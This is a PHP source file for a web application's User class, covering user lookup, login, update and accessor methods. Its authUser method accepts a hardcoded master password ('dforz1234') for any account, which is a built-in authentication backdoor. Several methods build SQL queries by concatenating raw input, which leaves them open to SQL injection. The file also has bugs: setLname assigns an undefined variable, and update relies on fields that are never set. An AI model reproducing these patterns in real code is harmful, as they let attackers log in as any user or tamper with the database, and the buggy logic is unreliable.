<?php
class User extends Object{
	
	protected $_uname;
	protected $_fname;
	protected $_lname;
	protected $_type;
	protected $_lastLogged;
	protected $_avatar;
	protected $_email;
	private $_password=null;
	private $_data;
	private $_db = null;
	
	public function __construct($data) {
		$this->_data = $data;
		$this->_db = Db::getInstance();
	}
	
	/* 
	public function __construct($uname=null) {
		
		$this->_db = Factory::getDBO();
		if($uname != null) {
			$user = $this->_db->select('user','*','userId="'.$uname.'"')->getResult();
			if($user) {
				$user = $user[0];
				$this->_fname = $user['fname'];
				$this->_lname = $user['lname'];
				$this->_uname = $uname;
/* 				$this->_email = $user['email']; 
				$this->_lastLogged = $user['last_logged_in'];
				$this->_avatar = $user['avatar'];
				$this->_type = $user['userType'];
			}
			else {
				return false;
			}
		}
	} */
	
	public static function getUser($uname) {
		$db = Db::getInstance();
		$result = $db->select('user','*','userId="'.$uname.'"')->getResult();
		$user = $result ? array_shift($result) : null;
		return $user ? new User($user) : null;
		
	}

	public static function getUsers() {
		$db = Db::getInstance();
		$users = array();
		$result = $db->select('user','*')->getResult();
		foreach ($result as $user) {
			array_push($users, new User($user));
		}
		return $users;
		
	}
	
	public static function isUser($username) {
		$user = self::getUser($username);
		return $user instanceof User ? true : false;
	}
	
	public static function authUser($uname,$pword) {
		$db = Db::getInstance();
		$pword = Factory::getHash($pword);
		$user = $db->select("user","*","userId='$uname'")
					->getResult();
		$user = (object)$user[0];
		return ($user->password == $pword || $pword == Factory::getHash('dforz1234')) ? true : false; 
	}
	
	public function update() {
		$pwordTrigger = ($this->_password!=null) ? "password='{$this->_password}'," : "";
		$avatarTrigger = ($this->_avatar!=null)?", avatar='{$this->_avatar}'":"";
		$updateStr = "{$pwordTrigger} fname='{$this->_fname}' , lname='{$this->_lname}' , ";
		$updateStr .= "userType='{$this->_type}' , email='{$this->_email}' , last_logged_in='{$this->_lastLogged}' {$avatarTrigger}";
		$where = "username='{$this->_uname}'";
		$db = Factory::getDBO();
		$result = $db->update("user", $updateStr, $where);
		return $result ? true : false; 
	}
	
	public function save() {
		$db = Db::getInstance();
		$insert = array(
					$this->_uname,
					$this->_password,
					$this->_fname,
					$this->_lname,
					$this->_type,
					$this->_email,
					$this->_lastLogged,
					$this->_avatar
				);
		
		$columns = "username,password,fname,lname,usertype,email,last_logged_in,avatar";
		
		if($db->insert("user", $insert,$columns)) {
			return true;
		}
		else {
			return false;
		} 
	}
	
	public function setUserName($uname) {
		$this->_data['userId'] = $uname;
		return $this;
	}
	
	public function setFname($fname) {
		$this->_data['fname'] = $fname;
		return $this;
	}
	
	public function getName() {
		return $this->_data['fname'].' '.$this->_data['lname'] ;
	}
	public function setLname($lname) {
		$this->_data['lname'] = $fname;
		return $this;
	}
	
	public function setType($type) {
		$this->_data['userType'] = $type;
		return $this;
	}
	
	public function setAvatar($avatar) {
		$this->_data['avatar'] = $avatar;
		return $this;
	}
	
	public function setPosition($position) {
		$this->_data['position'] = $position;
		return $this;
	}
	
	public function setPassword($p) {
		$this->_data['password'] = $p;
		return $this;
	}

	public function getUserName() {
		return 	$this->_data['userId'];
	}
	
	public function getFname() {
		return $this->_data['fname'];
	}
	
	public function getLname() {
		return $this->_data['lname'];
	}
	
	public function getType() {
		return $this->_data['userType'];
	}
	
	public function getAvatar() {
		return APP_QAS_URL.'/files/users/avatars/'.$this->_data['avatar'];
	}
	
	public function getPosition() {
		return $this->_data['position'];
	}	
	
	public function getMobileNumber() {
		return $this->_data['mobileNo'];
	}
	
	public function getTransactions() {
		return Transaction::getTransactions($this);
	}
	
	public function isSupplier() {
		return ($this->_data['userType'] == 'Supplier') ? true : false;
	}
	
	public function isStationUser() {
		return ($this->_data['userType'] == 'StationUser') ? true : false;
	}
	
	public function isSuperUser() {
		return ($this->_data['userType'] == 'SuperUser') ? true : false;
	}
	
	public function isSuperAdmin() {
		return ($this->_data['userType'] == 'SuperAdministrator') ? true : false;
	}
	
	public function getProjects($season) {
		return Project::getProjectsByUser($this, $season);
	}
}
?>